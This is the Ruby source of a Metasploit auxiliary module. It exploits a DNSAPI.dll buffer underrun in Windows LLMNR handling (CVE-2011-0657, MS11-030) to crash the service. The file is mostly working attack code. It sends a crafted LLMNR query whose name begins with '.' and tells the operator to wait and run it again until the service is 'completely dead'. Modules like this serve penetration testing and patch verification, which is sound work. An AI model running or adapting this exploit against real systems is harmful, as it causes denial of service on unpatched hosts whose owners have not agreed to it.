##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos
  include Msf::Auxiliary::LLMNR

  def initialize
    super(
      'Name'        => 'Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS',
      'Description' => %q{
          This module exploits a buffer underrun vulnerability in Microsoft's DNSAPI.dll
        as distributed with Windows Vista and later without KB2509553. By sending a
        specially crafted LLMNR query, containing a leading '.' character, an attacker
        can trigger stack exhaustion or potentially cause stack memory corruption.

        Although this vulnerability may lead to code execution, it has not been proven
        to be possible at the time of this writing.

        NOTE: In some circumstances, a '.' may be found before the top of the stack is
        reached. In these cases, this module may not be able to cause a crash.
      },
      'Author'      => 'jduck',
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2011-0657' ],
          [ 'OSVDB', '71780' ],
          [ 'MSB', 'MS11-030' ]
        ],
      'DisclosureDate' => 'Apr 12 2011')

      register_options(
      [
        OptString.new('NAME', [true, 'The name to query', '.1.1.in-addr.arpa']),
        OptString.new('TYPE', [true, 'The query type (name, # or TYPE# -- should be PTR)', 'PTR']),
        OptString.new('CLASS', [true, 'The query class (name, # or CLASS# -- should be IN)', 'IN'])
      ], Msf::Auxiliary::LLMNR)
  end

  def run
    connect_udp

    # TODO: various compressed queries
    #pkt << "\x03" + ("%d" % 192)
    #pkt << "\x03" + "144" + "\x01" + "0" + "\x03" + "168" + "\x03" + "192"
    #pkt << ("\x01" + '1') * 0x20
    #pkt << "\x01" + '.'
    #pkt << ("\x01\x2e") + "\x01" + "0"
    #pkt << "\x07" + 'in-addr' + "\x04" + 'arpa' + "\x00"
    #pkt << "\x03" + 'ip6' + "\x04" + 'arpa' + "\x00"
    #pkt << ".e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f".gsub('.', "\x01") + "\x03ip6\x04arpa\x00"

    print_status("#{rhost}:#{rport} Sending LLMNR query #{query_type_name}/#{query_type_name} for #{query_name}")
    udp_sock.put(query)

    print_status("Note, in a default configuration, the service will restart automatically twice.")
    print_status("In order to ensure it is completely dead, wait up to 5 minutes and run it again.")

    disconnect_udp
  end
end
